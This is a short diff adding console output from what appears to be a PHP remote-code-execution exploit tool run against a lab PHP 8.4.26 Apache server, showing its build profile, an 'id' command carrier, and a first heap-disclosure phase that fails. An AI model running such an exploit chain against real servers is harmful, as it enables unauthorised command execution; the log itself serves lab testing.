@@ -1,0 +1,9 @@
+[!] using build-specific profile php-8.4.26-amd64: Pinned official-derived PHP 8.4.26 amd64 Apache prefork lab; memory_limit=8M, session.upload_progress enabled, session.save_path=/tmp/php2shell-sessions, fixed worker pool
+[!] clean command carrier: 2/14 bytes ('id')
+[!] A/B affinity requires the declared fixed prefork pool to match --workers=1 and no concurrent target traffic
+[*] phase 1/3: heap disclosure
+[.] heap-a: request_bytes=3625154 sha256=6800abc0f788bc75f2955abdce7c691ac1d59c82967dd34881fbe23c3a509ec4
+[.] POST /index.php: body=3625154 response=211 send_error=None recv_error=None
+[.] heap-b: request_bytes=2137297 sha256=8a88371a4204460c2bd26494145943209c25770c80d79595f182f8976b3546dd
+[.] POST /index.php: body=2137297 response=290 send_error=None recv_error=None
+[-] heap disclosure length 32 != 4000
